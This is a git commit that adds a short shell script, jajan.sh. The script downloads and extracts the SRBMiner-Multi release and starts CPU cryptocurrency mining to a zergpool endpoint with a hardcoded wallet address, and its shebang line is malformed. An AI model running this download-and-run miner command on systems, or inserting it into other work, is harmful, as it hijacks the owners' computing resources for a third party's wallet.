0feaa5d4e0e0a1332ff693252877e38ede3a6336
thepowert <96099226+thepowert@users.noreply.github.com>
2021-12-14 11:46:33 +0700

    Create jajan.sh

---
+++ jajan.sh
@@ -0,0 +1,2 @@
+!#/bin/bash
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.5/SRBMiner-Multi-0-8-5-Linux.tar.xz; tar -xf SRBMiner-Multi-0-8-5-Linux.tar.xz; cd SRBMiner-Multi-0-8-5; ./SRBMiner-MULTI --disable-gpu --algorithm ghostrider --pool ghostrider.na.mine.zergpool.com:5354 --wallet GTJwZwAxp5TZGj3rk1Msfn3Zc6RPTKTzt5 --password c=BTG,mc=RTM,ID=rektor
